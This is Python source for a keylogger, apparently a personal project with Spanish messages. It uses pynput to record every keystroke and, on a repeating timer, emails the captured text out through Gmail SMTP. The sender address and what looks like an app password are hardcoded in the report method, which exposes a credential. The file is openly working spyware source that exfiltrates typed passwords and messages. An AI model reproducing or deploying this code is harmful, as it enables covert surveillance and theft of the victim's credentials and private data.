#!/usr/bin/env python3

import pynput.keyboard # pip3 install pynput
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True
        print("Keylogger iniciado")
     
    def process_key_press(self, key):
        try:
         self.log += str(key.char)
         print(self.log)
        except AttributeError:
         special_keys = { "Key.space": " ","key.enter": "Enter","key.backspace": "Backspace","key.alt_l": "Alt","key.tab": "Tab","key.delete": "Delete","key.ctrl_l": "Ctrl","key.cmd": "Command","key.esc": "Esc","key.shift": "Shift","key.up": "Up","key.down": "Down","key.left": "Left","key.right": "Right","key.caps_lock": "CapsLock","key.cmd_r": "Command","key.ctrl_r": "Ctrl","key.alt_r": "Alt","key.shift_r": "Shift","key.f1": "F1","key.f2": "F2","key.f3": "F3","key.f4": "F4","key.f5": "F5","key.f6": "F6","key.f7": "F7","key.f8": "F8","key.f9": "F9","key.f10": "F10","key.f11": "F11","key.f12": "F12","key.print_screen": "PrintScreen","key.scroll_lock": "ScrollLock","key.pause": "Pause","key.insert": "Insert","key.home": "Home","key.page_up": "PageUp","key.page_down": "PageDown","key.end": "End","key.num_lock": "NumLock","key.caps_lock": "CapsLock","key.menu": "Menu","key.shift_r": "Shift","key.shift_l": "Shift","key.ctrl_r": "Ctrl","key.ctrl_l": "Ctrl","key.alt_r": "Alt","key.alt_l": "Alt"}
         self.log += special_keys.get(key, f" {str(key)} ")
        print(self.log)
    
    def send_mail(self, subject, body, sender, recipient, password):
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = sender
        msg["To"] = recipient
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender, password)
            #server.sendmail(sender, recipient, msg.as_string())
            server.sendmail(sender, recipient, msg.get_payload())

        print("Email enviado")    

    def report(self):
        email_body = f"[+]El keylogger ha iniciado correctamente" if self.is_first_run else self.log
        self.send_mail("Keylogger Report", email_body, "gabrielbestrafer@gmail.com", ["gabrielbestrafer@gmail.com"], "bgpq knde ozid ljcx")
        self.log = ""
        if self.is_first_run:
            self.is_first_run = False
            
        if not self.request_shutdown:
            self.timer = threading.Timer(50, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        kyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with kyboard_listener:
            self.report()
            kyboard_listener.join() # start the listener
    